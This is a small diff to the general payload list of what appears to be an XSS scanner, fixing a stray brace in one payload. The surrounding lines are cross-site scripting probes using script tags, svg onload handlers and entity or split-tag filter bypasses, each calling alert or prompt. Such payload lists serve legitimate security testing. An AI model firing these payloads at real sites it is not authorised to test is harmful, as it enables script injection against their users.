@@ -11,7 +11,7 @@ xssRadar.scanner.payloads.general = [
 "<svg onload=alert&#x28;{id}&#x29>",
 "<svg onload=alert&#40;{id}&#41>",
 "--!><svg/onload=prompt({id})",
-"--><script>alert({id}})</script>",
+"--><script>alert({id})</script>",
 "&lt;script&gt;alert(&#39;{id}&#39;);&lt;/script&gt;",
 "< / script >< script >alert({id})< / script >",
 "<sc<script>ript>alert({id})</sc</script>ript>",
